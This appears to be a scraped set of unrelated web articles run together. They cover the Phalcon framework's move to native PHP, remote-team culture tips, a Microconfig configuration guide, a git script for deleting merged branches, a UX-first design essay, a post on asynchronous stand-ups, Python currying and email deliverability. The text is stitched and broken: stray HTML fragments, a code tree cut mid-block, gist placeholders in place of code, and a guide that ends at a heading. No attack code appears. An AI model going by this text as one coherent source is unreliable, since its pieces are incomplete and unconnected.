<p><a href="https://zephir-lang.com/">Zephir</a> was invented to help with contributions for Phalcon - a much simpler language, similar to JS/PHP, that anyone can learn easily and contribute. Unfortunately, the language did not gain popularity, and therefore not many people wanted to contribute. The language became stagnant and difficult to maintain. A lot of bugs were discovered and ended up being very difficult to fix unless the whole language was redesigned.</p>

<p>With no other options available, we will put active development of Zephir on hold, and we do not expect it to be compatible with PHP 8. Maintainers are always welcome to step up and help with Zephir.</p>

<h3 id="phalcon">Phalcon</h3>

<p>Without Zephir we are not going to be able to properly maintain and enhance Phalcon. This leaves us with two options:</p>
<ul>
  <li>abandon Phalcon or</li>
  <li>take the brave step to move forward by switching to native PHP.</li>
</ul>

<p>The team decided to switch to native PHP for Phalcon 5. We will try to support Phalcon 4 as much as possible and try to release Phalcon 4.1. We will use our funds to fix some critical Zephir issues that are blocking Phalcon.</p>

<h3 id="phalcon-5">Phalcon 5</h3>
<ul>
  <li>Pure PHP implementation</li>
  <li>Installable as <code>composer</code> package</li>
  <li>Backwards compatible as much as possible (it will depend on how easy we can translate the current C parsers for Volt, PHQL and Annotations)</li>
  <li>Support PHP 7.4 + PHP 8 (Currently in Beta)</li>
  <li>Phalcon goals and philosophy remain unchanged (performance, low overhead, ease of use)</li>
  <li><a href="https://github.com/niden/cardoe">Cardoe</a> (side project by <a href="https://github.com/niden">niden</a> can be used as starting point</li>
  <li><a href="https://github.com/pmjones/adr">ADR</a> (Action Domain Responder) pattern as scheduled around v4</li>
  <li>Will aim for 100% code coverage and tests</li>
  <li>Opens up the possibility for async (future)</li>
</ul>

</ul>

<p><strong>December</strong></p>
<ul>

  <li>Sample apps</li>
</ul>

<h3 id="conclusion">Conclusion</h3>
<p>This is not a decision we wanted to make but we have to be realists. We cannot abandon the community and we do believe that Phalcon is a great project that adds value to the PHP community.</p>

<p>Although we will lose some of the performance that we had been accustomed to by using Phalcon, PHP 7 and (hopefully) PHP 8 managed to bridge the performance gap that we saw when using PHP 5.x and Phalcon.</p>

<p>Our main focus will always be to keep the framework as fast as possible. By switching to PHP, the community can now be more actively involved with the project and also help with addons, incubator and much more.</p>

<p>Thank you to all and looking forward to the new challenges that v5 will present us with.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Nowadays, more and more people prefer to work from home, so it’s quite common for businesses to have a remote-first team. Developing a healthy company culture when most of your team is remote can be difficult, but we are here to help. Here you have a list with some of the top tips and tricks you can use to establish a stellar remote-first company culture!</p><h2>Perform team building activities on Zoom</h2><p>The truth is that it can be difficult to connect with each other when most of the team works remotely. That’s why the best approach here is to have all kinds of team building activities via Zoom. Something as simple as discussing movies, sharing ideas and even playing some games while social distancing can help a lot. You want to help your team relax and unwind, so any remote team building activities will help a lot.</p><h2>Encourage everyone to communicate and share feedback</h2><p>A great remote-first company culture focuses on communication. Even if the entire team is remote, it’s extremely important to connect with one another, ask for feedback and see what can be improved. Allowing everyone to speak their mind and listening to what they have to say is very productive. It also encourages every employee to deliver their best, which leads to more productivity and higher profits.</p><h2>Offer the best remote infrastructure</h2><p>Make sure that your team has all they need in order to work efficiently. Using tools like Slack for example boost team management and it also makes tracking tasks a lot easier. You can also rely on cloud solutions for storing and sharing documents. Google Drive or Dropbox will do just fine here. The idea is to constantly bring in the best remote work solutions and implement them wisely. Your team will be happy and a lot more productive.</p><h2>Automation is key</h2><p>Finding ways to automate tasks for your remote team can be very important. You do want to make sure that you focus on ways that increase the workflow efficiency. Automating even the simplest tasks will open up more time for your team to work on those things that really matter.</p><h2>Stay away from employee monitoring tools</h2><p>A lot of business owners believe that employees waste time when they work remotely. The truth is that employees are more efficient when they work from home. Which is why the best company culture is focused on transparency and trust. You shouldn’t use employee monitoring tools, as they are invasive and show a lack of trust right from the start.</p><h2>Conclusion</h2><p>Using these tips and tricks will make it easier than ever to develop a healthy remote work mentality. You always want to make sure that you commit to the idea of having a remote team and assist them the best way that you can. Everything from delivering the right remote work infrastructure to having great ideas for virtual events will help a lot. Remote work is the future, so having a remote-first company culture can set your business apart!</p><p>At <a href="https://onsite.fun/">onsite.fun</a> we want to take care of it, so you can be efficient with your tasks and spend the time on more productive. If you have an event you’re thinking about running but unsure of how to do so - give us a ping at jaume@onsite.fun and the team will be sure to help you out.</p></div></div>]]>

                    <p>This guide describes how Microconfig can help you solve common microservice configuration
                        problems.
                    </p>
                    <p>More details you can find in <a href="https://microconfig.io/documentation.html">Docs</a>. </p>

                    <section id="layout">
                        <h2>Simple Configuration Layout</h2>

                        <div>
                            <div>
                                <div>
                                    <h4>Problem</h4>

                                    <p>Other configuration frameworks can demand a specific configuration folder
                                        structure or specific filenames.
                                    </p>
                                </div>

                                    <h4>Solution</h4>

                                    <p>Microconfig only asks you to create folders for your services somewhere in
                                        <code>components</code> folder. You choose the names and folder structure. If
                                        you have different types of configuration just place them in the same service
                                        folder.
                                    </p>
                                </div>
                            </div>
                        </div>

                        <pre><code>
                        components
                        ├── payments
                        │   ├── payment-backend

                        <h2>Reuse Common Parts</h2>

                        <div>
                            <div>
                                <div>
                                    <h4>Problem</h4>
                                    <p>Microservices have a lot of shared configuration parts that is copy-pasted
                                        between them. So you need to go through all services one by one to update this
                                        shared part.
                                    </p>
                                </div>

                                <div>
                                    <h4>Solution</h4>

                                    <p>Microconfig allows you to extract common parts of configuration to a dedicated
                                        component and reuse it with <code>#include</code>. This way service config is
                                        more focused on unique parts and all common parts are just included. In this
                                        case if
                                        you need to update your common part you just do it in one place and everyone
                                        gets
                                        this update via <code>#include</code>.
                                    </p>
                                </div>
                            </div>

                    </section>

                    <section id="placeholders">
                        <h2>Reference Values</h2>

                        <div>
                            <div>

                                    <h4>Problem</h4>
                                    <p>Different services can depend on each other's configuration keys. For example
                                        frontend needs backend's api base path. You can just keep this value in two
                                        places but in this case you need to remember about this dependency and update
                                        them
                                        both.
                                    </p>
                                </div>

                                <div>
                                    <h4>Solution</h4>
                                    <p>Microconfig can reference a value from current or another component with a
                                        <code>${placeholder}</code>. This allows you to keep values only in original
                                        services and all who depend on them can just have an explicit reference. In this
                                        case you need to update the value only once.
                                    </p>
                                </div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/tools"><p>Tools</p></a><p>This is a short Github guide our new developers often use to get a hand on Github and its commit hooks in our projects. (You are also welcome to
take a look at it if you’re interested.)</p></div></div><article><div target="_blank"><p>Today, I want to show how you can automate removing of old branches when merging child branches in a parent branch. Now, one can say this topic had already been overtaken due to the wide use of CI and services like github/bitbucket. But as the story says: “Github will help only those who help themselves.”</p><p>Let’s assume we have a project of the following structure:</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5cf6797c2002df1becea68be_Project-structure.png" alt=""></p></figure><p>To start removing branches, we need to define first what actually needs to be removed.<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/0f3b520ca7b84f556b50c4bcde0149da.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>Returns all branches names that contain current commit. If HEAD is on e, we will get the following output:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/02c06d38b9993082b991d515c1dad854.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>To exclude the current branch, as well as a master one, from the output, let’s add the following regex:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/30d065dc3c5ae11eb456ff063df945cf.js&lt;/p&gt;<br>‍</em></p><p><em>‍</em>If you need to exclude any more branches, ‘develop’ for example, the expression will look like:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/906da61330d1353aa296f61a4a5adeab.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>To remove detected branches from the remote repository, we run the command:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/8403671fe876563c3edc4d4726333ab8.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>And here’s how it will look like after being combined with the logic we already have:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/1af166f0ae8f865d1aeae3a0725bd799.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>Now after we’ve written a code that removes a branch from a remote repository, we need to make sure that local branch copies always end up being removed too. The following instruction will help us so this:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/7c7ef77be856d1113acc4fdcdabbe914.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>After removing all branches from a ‘remote’, this is how instruction’s output will look like:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/238138cf132fec641ef1c16c75d1572b.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>As seen from the output, branches now have ‘gone’ status, which allows us to write a regex, find branches, and delete them.<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/7428abde45bc5e6617dcf7be0dc6a4fa.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>From combining it with the previous expression, we’ll get:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/8d467f419e9a17e933e3b688115f2f75.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>After command execution, we’ll get the following output:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/3ec1be515fc7fe83de2101fff64da198.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>For the sake of convenience, let’s add ‘alias’ for this command into gitconfig, by calling<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/1fa9ea5fd8801f573f2ad2ec497286f8.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>And adding the following string there:<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/d89da263294f3b2ad749fee965887eff.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>Now we can remove branches with a single command<br>‍</p><p>‍<br>‍<em>&lt;p&gt;CODE: https://gist.github.com/VladMogwai/a6508abab7e7e1e51683e9edf05bbf4d.js&lt;/p&gt;</em></p><p><em>‍<br>‍</em>There’s only one small problem left: no to forget to run a script that removes unnecessary branches whenever merging is done.

		<p>Imagine you are building your dream house. Would you trust a general contractor who talks like this?</p>
<blockquote><p>First, we’re going to pick out the material for the kitchen counter and the glass for the windows. Let’s just guess the amounts of each to buy for now.</p>
<p>Then we’ve got to buy some of that new concrete everyone’s been talking about. I suppose a truckload will do it for now, but we could always order more later. I just can’t wait to try it out!</p>
<p>After putting the beams in place we should decide how many floors the house should have. And right at the end we should decide what style the house will be. Sometime before you move in we should get planning permission, and I’ll probably contact an architect for some drawings after you’ve settled in.</p></blockquote>
<p>It sounds ludicrous because there’s a well-established method for building houses, and it’s based on common sense. You start with a vision, get a set of plans, pour a foundation, build the framework, fill in the internal stuff, and finally finish all the little details.</p>
<p>Putting any step out of order would cause complete chaos. Finishing the walls before the electrical would mean you’d have to punch holes in all your walls in order to run wires around the house. Cleaning it before it is completely finished would be a wasted effort given the amount of dust builders cause while they work.</p>
<p>However many coders <strong>build their systems backwards</strong>. They become enamored with the latest whizz-bang framework or charmed by the reportedly speedy performance of the newest database. And they lead their thinking with those choices as they build new features, whether those technologies are appropriate or not.</p>
<p>More importantly, using a technology-first design typically means that the user experience (UX) will be left until last. And if you put your users last in your order of priorities, it will unfortunately be very evident in your system’s lack of usability.</p>
<h3>UX First</h3>
<p>The first order of business in application design is deciding what its users will experience. This should be a high-level vision sketched out on paper or in simple digital mockups, and it should express the flow of the system from the user’s perspective.</p>
<p>It doesn’t matter if you’re building a web application for senior citizens or a system-level tool for serious computing nerds. <strong>The UX must be designed first.</strong></p>

</tbody>
</table>
<h3>Then Comes The Architecture</h3>
<p>Once the UX has been designed and the vision of the system has been defined, an architecture should be laid out to make sure that the code that eventually gets written will actually meet the needs of the users. The choices made in the UX design radically shape and inform a system’s architecture.</p>
<p>A good UX design will cater for less obvious things that might be part of the overall user experience. A well-written specification might include requirements such as “the overall load time for page loads must be less than 200 msec” because the designers know the consequences of <a href="http://blog.kissmetrics.com/loading-time/">slow page load speeds</a>. It might also call for close-to-zero downtime, so the architecture might end up requiring a <a href="http://www.informationweek.com/cloud-computing/infrastructure/amazon-outage-multiple-zones-a-smart-str/240009598">multi-datacenter deployment</a>.</p>
<h3>Last But Not Least, The Tools</h3>
<p>Now it’s finally playtime! Once the UX has been defined and the architecture has been laid out, the process of picking the right technologies, frameworks and libraries can begin. The crucial point is that now the tools are being chosen with the UX and architecture in mind, so any tool that doesn’t fulfill the needs of either can be quickly disregarded.</p>
<h3>This Does Not Mean “Waterfall”</h3>
<p>If you think that this design sequence requires an outdated <a href="http://en.wikipedia.org/wiki/Waterfall_model">Waterfall-like</a> approach to accommodate it, think again! This is completely appropriate for <a href="http://en.wikipedia.org/wiki/Agile_software_development">Agile</a> development. The implementation of a whole new product, an <a href="http://agile101.net/2009/08/10/the-difference-between-agile-themes-epics-and-user-stories/">epic</a> or even a single user story should follow the UX -&gt; architecture -&gt; tools sequence. When beginning the development of a product or epic,&nbsp;<a href="http://uxdesign.smashingmagazine.com/2012/11/06/design-spikes-fit-big-picture-ux-agile-development/">spikes</a> should be used to design the UX and the architecture. And individual user stories should include enough details for the engineer to know what the UX for that story should be once it is fully implemented, and the engineer should also estimate enough points to cater for architectural planning to be done once work on that story begins.</p>
<p>Tools are great fun to research and to experiment with. Programmers love discovering new ones and finding “The Next Big Thing” in the framework jungle, and having lots of tools at your disposal is wonderful when the time comes to build a system that satisfies the UX and the architecture. Just don’t begin the entire design process with them. So remember: UX first, then architecture, then tools.</p>

            <section>
                <div>
                    <p>I've recently read a <a href="https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened">rather popular blog post</a> about cancelling stand-ups and how it affected team's productivity. While I find the topic extremely interesting and I like experimenting with changing processes, the post lacked some long-term conclusion (hopefully a 2nd part is coming in a few months!). I thought I could share my experience with making stand-ups shorter and more effective. I do not have any hard numbers to show, what I have is experience and some rough estimations from 3 companies I worked with where I participated in daily stand-ups.</p><h2 id="15-minutes-or-1-hour">15 minutes or 1 hour?</h2><p>In the 1st company, I was a new employee and I had little say about team processes, so I followed the by-the-book style that the team implemented.</p><p>Every morning I arrived at work around 9:30am, I grabbed a cup of coffee, and in 5-10 minutes I was at my desk ready to work. However, at 10am I had a stand-up, so I spent the 20min I had on replying to e-mails and chatting with my coworkers.</p><p>Stand-up was in a separate room, where the whole team met at 9:55am so that we could connect with a few people who worked in another office. Ignoring random audio/video problems, we usually wrapped things up in 20 minutes, with occasional 10min follow-up after the call. Sometimes discussion took a bit longer, but usually I was back at my desk by 10:30am, an hour after coming to work.</p><p>I guess this is not exactly how stand-up looks like in your "Scrum for beginners" manual, but that's how it worked in practice, and trust me, that company is not an outlier. It worked quite well for some people, especially those who came to work just before 10am, while I found the lost hour a bit frustrating. I tried to change it, but everyone else felt ok with the way things were, so we kept it the way it was.</p><p>The total time I spent on stand-ups was around 30min a day, so 2.5h a week (5h if counting the 30min a day that were kind of wasted, but who knows, maybe I would be wasting them anyway).</p><figure><img src="https://www.notonlycode.org/content/images/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg" alt="" srcset="https://www.notonlycode.org/content/images/size/w600/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 600w, https://www.notonlycode.org/content/images/size/w1000/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 1000w, https://www.notonlycode.org/content/images/size/w1600/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 1600w, https://www.notonlycode.org/content/images/2020/11/bartosz-kwitkowski-OJ9E5C-hFJQ-unsplash.jpg 1920w" sizes="(min-width: 720px) 720px"></figure><h2 id="how-to-scale-a-stand-up">How to scale a stand-up?</h2><p>In the 2nd company I was a team lead and we had a classic, quick stand-up. Next to our desks, all people standing in a circle, one by one saying what they did, what they are doing and what's blocking them. Anything to discuss? Do it in smaller groups right after the stand-up. It usually took 1min per person, 10, maximum 15min in total.</p><p>This was going well for a while, but over time it became more difficult to manage. First, as we were approaching 15 developers and we split into 2 teams, we needed a way to split the stand-ups as well, but how to do it when we all sit together? First goes one group and then another? That felt awkward, as did having everyone go to a meeting room for 10 minutes.</p><p>The 2nd challenge was that we expanded our team to a new office in another country. One of the things I wanted to prevent was separating all work and rituals by location - this alienates people working from new office and makes them feel less attached to the company. We considered having a call every morning, with 2 groups standing in front of the camera in their respective offices. It's not a bad solution, but having experienced it in the past I knew how awkward it feels, and how making sure the connection works can take longer than the meeting itself.</p><h2 id="good-morning-yesterday-i-">Good morning! Yesterday I...</h2><p>So what we did was to remove stand-ups. Or rather, we removed stand-up as a meeting, while keeping the update part. We moved it to Slack, so that every morning, every team member was supposed to write a short message when they started working. A short "good morning team!" followed by 3 bullet points. This provided a few benefits:</p><ul><li>scaling - each team has their own channel where they write the message</li><li>persistence - messages stay on Slack, so it's always easy to get back to something that I was supposed to follow-up on. Also, it made it possible to add links to tasks or documentation, and discussing any blockers was easy - just reply to the update message</li><li>flexibility - you come to work, you sit down, you check what you've got to do today and you write "Good morning everyone! Here's my update...". It's the first thing you do, and then you can start working. It takes 2-3 minutes and you don't need to wait for anyone. You can read other updates later when everyone's in, and if someone needs your help, they'll tag you.</li></ul><p>So in this case we didn't really save any significant amount of time (not that there was a lot of time to save in the first place). Writing and reading all the messages could even take a bit more than before. But we got a lot in exchange - and we never looked back.</p><figure><img src="https://www.notonlycode.org/content/images/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg" alt="" srcset="https://www.notonlycode.org/content/images/size/w600/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 600w, https://www.notonlycode.org/content/images/size/w1000/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 1000w, https://www.notonlycode.org/content/images/size/w1600/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 1600w, https://www.notonlycode.org/content/images/2020/11/rizal-hilman-VbTcrQ-H8aE-unsplash.jpg 1920w" sizes="(min-width: 720px) 720px"></figure><h2 id="rinse-repeat">Rinse, repeat</h2><p>This experience helped me in the 3rd company. When I joined it, stand-ups were happening over a call (around half of the team was remote) and usually took around 30-40 minutes. Yes, you're right, that's way too long. 30-40 minutes * 5 days means 2.5-3 hours a week spent by every team member on what's supposed to be a quick update.</p><p>I quickly realized the issue was that while a few people had short and concise updates, others were taking their time and often started longer discussions. I took various attempts to change it - tried to limit stand-up time to 15 minutes, reminding people to discuss other topics after the call in smaller group, etc. but I was not satisfied with the results. Finally I got a small win - we introduced Fridays without meetings and that meant no stand-up either. In order to stay in touch about the progress and blockers, we decided to just write updates on chat. What started as once a week initiative, after a couple of weeks turned into a daily practice, we moved to entirely asynchronous stand-ups and again we never looked back.</p><p>As I have mentioned before, the amount of time we saved was around 3 hours per person every week. For me, this was huge!</p><h2 id="not-perfect">Not perfect</h2><p>One thing I'm really happy about is that in both cases where I managed to introduce the change, after a while it gained essentially unanimous support - everyone told me they preferred the asynchronous updates.</p><p>There are a few aspects though in which this idea could be improved, and a few in which it will always be worse than a classic meeting. Seeing and hearing your peers is something that can't be replaced. Reading messages removes that human touch, it strips us of things that make us feel that we're talking to real people. In my case this wasn't a big issue as we had enough other calls each week anyway not to miss each other, but it might not be the case in every company.</p><p>Missing messages is another challenge - if you come to work first and write your message, then you need to make sure that later you read messages by other people who start work later. If people don't do that, then what's even the point of sending updates? I struggled a bit to follow all messages everyday, something that didn't happen during classic stand-up. This problem can be solved with a dedicated tool that will remind you to send a message each morning, and will compile all updates into one longer message when all team members provide their updates. Alternatively you can set a reminder to read all the messages at some point during day, when you expect them all to be there.</p><figure><img src="https://www.notonlycode.org/content/images/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg" alt="" srcset="https://www.notonlycode.org/content/images/size/w600/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 600w, https://www.notonlycode.org/content/images/size/w1000/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 1000w, https://www.notonlycode.org/content/images/size/w1600/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 1600w, https://www.notonlycode.org/content/images/2020/11/fred-kearney-saJ060B-sz4-unsplash.jpg 1920w" sizes="(min-width: 720px) 720px"></figure><h2 id="throw-out-the-book">Throw out the book</h2><p>One of the most common problems I have when trying to improve processes are people who specialize in certain system or methodology (often certified in it), who tell me that's not how things should be done. Whether they're fans of Kanban, Scrum or something else, I often hear "we should not do it, this is against Scrum guides".</p><p>I believe such attitude is against the principles of good team work. Whenever something doesn't work, I try to change it. If it gets better, I keep the good parts and keep improving. If it gets worse, I learn the lesson and change the direction.</p><p>Me and my teams in the past changed the daily stand-ups, because they didn't work for us. We wanted to stay updated, so we kept that part, and we improved the rest. I don't know if that's going to work in your team too, maybe not - only you can try it out and see if your team likes it. So go ahead, keep the good parts, throw out the rest of the book, try to make your way of work better. Good luck!</p><p>Comments and discussion: <a href="https://news.ycombinator.com/item?id=25288137">https://news.ycombinator.com/item?id=25288137</a></p><h2 id="credits">Credits</h2><p>Burning book photo by <a href="https://unsplash.com/@fredasem?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Fred Kearney</a> on <a href="https://unsplash.com/s/photos/book-burn?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a><br>Paddleboard photo by <a href="https://unsplash.com/@kowalikus?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Krzysztof Kowalik</a> on <a href="https://unsplash.com/s/photos/stand-up?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a><br>Scale photo by <a href="https://unsplash.com/@smee?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Bartosz Kwitkowski</a> on <a href="https://unsplash.com/s/photos/scale?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a><br>Hand washing photo by <a href="https://unsplash.com/@rzhilman?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Rizal Hilman</a> on <a href="https://unsplash.com/s/photos/hand-wash?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Currying is a technique in mathematics and computer science named after the mathematician Haskell Curry.</p><p>In simple terms, you create new functions from a function that takes multiple arguments, each derived function will then take only a single argument.</p><p>This is done by applying Partial Argument Application to the function with multiple arguments that you are deriving.</p><h2>Code Example</h2><p>Let’s visualize this with a simple function that multiplies two numbers:</p><pre><code>def multiply_numbers(a, b):
    return a * b</code></pre><p>Using this function as a base, we decided to create a new function that takes a single argument and always multiplies the argument by 3, so the second function below calls the first one above but keeping the first argument of <code>multiply_numbers(a, b)</code> fixed as 3.</p><pre><code>def multiply_by_three(a):
    return multiply_numbers(a, 3)</code></pre><p>Rewriting <code>multiply_by_three(a)</code> as a <a href="https://renanmf.com/python-lambda-functions/">lambda function</a>, the code above will turn into:</p><pre><code>multiply_by_three = lambda a : multiply_numbers(a, 3)</code></pre><p>The argument <code>b</code> from <code>multiply_numbers(a, b)</code> was <em>curried</em>.</p><h2>The <code>partial</code> function</h2><p>The <code>functools</code> built-in module has the <code>partial()</code> function that allows us to use a partial application of a function in a more simplified way:</p><pre><code>from functools import partial
multiply_by_three = partial(multiply_numbers, 3)</code></pre><p>Executing the function <code>multiply_by_three</code> above with 5 as argument, we have:</p><pre><code>&gt;&gt;&gt; multiply_by_three(5)
15</code></pre></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>We are delighted to offer this&nbsp;comprehensive guide to email deliverability, Having&nbsp;spent time building a targeted email list, and your creative team has drafted some awesome emails. The problem then is&nbsp;email deliverability. So this guide is designed to overcome all the problems which inhibit that..</p>
<p>If an email ends up in the junk folder, then did it ever even exist? For your customer, the answer is no. But don’t worry.</p>
<p>In this guide, we’re going to deep dive into <strong>email deliverability</strong>. And we’re going to show you how to <strong>keep your emails away from the dreaded spam folder.</strong></p>
<p>Ready to up your open rate and get more clicks to your website? Let’s get started.</p>
<p>So, what do you need to be doing to <strong>boost your email deliverability?</strong></p>
<p>First, the facts:</p>
<h2 id="what-is"><strong>What is Email Deliverability?</strong></h2>
<p><em>Email Deliverability</em> is the set of processes responsible for <strong>placing an email into your client’s inbox.</strong></p>
<p><strong>Inbox placement and delivery</strong> is a complex subject. Many factors are taken into account by mailbox providers before placing an email into your subscribers’ inbox.</p>
<h2 id="email-reputation-impacts-deliverability"><strong>Part 1: How Email Reputation Impacts Email Deliverability</strong></h2>
<p>When you send an email campaign, <strong>mailbox providers run an initial set of vetting checks.</strong></p>
<p>These are known as<strong> reputation checks</strong>.</p>
<p>And they are a bit like credit checks for email, affected by:</p>
<ul>
<li><strong>Sender reputation</strong></li>
<li><strong>Server / IP reputation</strong> used to dispatch the email</li>
<li><strong>Domain reputation</strong> of links in the content</li>
<li><strong>Email engagement metrics</strong> including bounce and spam complaint rates for your sender, domain, and server</li>
</ul>
<p>Reputation checks are one of the most essential factors of <strong>inbox placement.</strong></p>
<p>A bad reputation will see your inbox placement and open rates tank.</p>
<p>Let’s look at all the factors that are bound to <strong>email delivery reputation. </strong></p>
<p>We’ll start with your sender reputation.</p>
<h3><strong>What is Sender Reputation?</strong></h3>
<p><strong>Sender reputation is the reputation of the email address</strong> you are using to send out your email campaigns.</p>
<p>Usually, your sender reputation is calculated on <strong>a scale of 0 to 100 to give you your&nbsp;</strong><strong>sender score.</strong></p>
<p>But how exactly does sender reputation work? What factors increase or decrease your sender reputation?</p>
<div>
<p>Email Deliverability goes hand in hand with sender reputation. Here are five factors positively influencing sender reputation: consistent volume of email campaigns per week, few bounces, fewer complaints, no spam traps, no blacklists.</p>

</div>
<h3><strong>1. Be Consistent with Your Volume</strong></h3>
<p><em>Try to distribute your email marketing campaigns evenly.</em></p>
<p>A <strong>consistent volume of email campaigns</strong>, without major drops or spikes, plays a significant role in sender reputation.</p>
<p>For example, if you send out an email to your list twice a week, switching to three times a week will cause ripples.</p>
<p>There will be times when you will want to send out more emails than usual.</p>
<p>For example, over the busy Christmas period. But aim for a regular, consistent schedule where possible.</p>
<p>Your list will soon get to know your schedule, which will help you <strong>increase open rates and click-throughs.</strong></p>
<h3><strong>2. Keep Your Lists Clean to Crush Bounce Rate</strong></h3>
<p><em>Clean your lists.</em></p>
<p>At Moosend, we use <a href="https://neverbounce.com/">NeverBounce</a>,&nbsp;<a href="https://www.datavalidation.com/">Data Validation</a>, <a href="https://www.emaillistverify.com/">Email List Verify</a>, among others.</p>
<p>Some other notable alternatives are <a href="https://www.zerobounce.net/">ZeroBounce</a>,&nbsp;<a href="https://myemailverifier.com/">MyEmailVerifier</a>, <a href="https://debounce.io/">Debounce</a>, and <a href="https://clearout.io/">Clearout</a>.</p>
<p><a href="https://help.moosend.com/hc/en-us/articles/211743305-Top-3-reasons-your-emails-could-Bounce">Bounces</a> are emails that fail to reach the subscriber<strong>.</strong></p>
<p>Notwithstanding their impact on <strong>future email deliverability</strong>, they are a waste of resources.</p>
<p>There are two types of bounce,<strong> soft and hard bounce.</strong></p>
<h4><strong>What is Hard Bounce?</strong></h4>
<p>A hard bounce happens when you <strong>send a message to a mailbox that doesn’t exist. </strong></p>
<p>Perhaps someone used a fake email to sign up to your subscriber list, or have changed email providers.</p>
<p>Either way, you don’t want those email addresses on your list.</p>
<h4><strong>What is Soft Bounce?</strong></h4>
<p>A soft bounce occurs when you send to a:</p>
<ul>
<li><strong>mailbox that is full</strong></li>
<li><strong>recipient with an auto-reply / out-of-office message</strong></li>
</ul>
<p>You probably don’t want to remove these email addresses from your subscriber list.</p>
<p>Usually, this will be a temporary issue. But if your messages are consistently bouncing, you might want to reconsider.</p>
<p>Mailbox providers, such as Gmail, monitor the bounce messages. They then return undelivered emails to the email service provider.</p>
<p>A high <a href="https://backlinko.com/hub/seo/bounce-rate">bounce rate</a> implies a poor list hygiene process.</p>
<p>That could mean a list that is <strong>not contacted frequently or is purchased.</strong></p>
<p>Therefore, you need an&nbsp;<a href="https://snov.io/blog/how-to-check-if-an-email-address-is-100-valid-or-not/">email verifier</a> to check the email addresses and be 100% sure that they are valid.</p>
<h3><strong>3. Spam Complaints = Death for Your List</strong></h3>
<p>When your subscribers hit the dreaded “Mark as spam” button, mailbox providers like Gmail and ESPs receive a notification.</p>
<p>The bad news?</p>
<p>Mailbox providers automatically block even senders with a small number of complaints.</p>
<p>It’s for this reason that we strongly<strong> discourage the use of purchased lists </strong>as they will see your spam complaints rocket.</p>
<h3><strong>4. Steer Clear οf Spam Traps</strong></h3>
<p><em>What’s a spam trap?</em></p>
<p>It’s a fake email address that looks real, but it isn’t.</p>
<p><a href="https://www.zerobounce.net/spam-traps.html">Spam traps</a> are set by Internet Service Providers (ISPs) and blacklist providers to catch unscrupulous email marketers who have been harvesting emails.</p>
<p>They’re like honeypots that are published in a hidden location on the web.</p>
<p>When spammers collect email addresses through harvester programs or purchased email lists, these fake email addresses often make it onto their lists.</p>
<p>Sending even a tiny amount of emails to those email addresses <strong>automatically marks the sender as a spammer. </strong></p>
<p>It’s clear that they built their list unnaturally.</p>
<h3><strong>5. Whatever You Do, Don’t Get Blacklisted!</strong></h3>
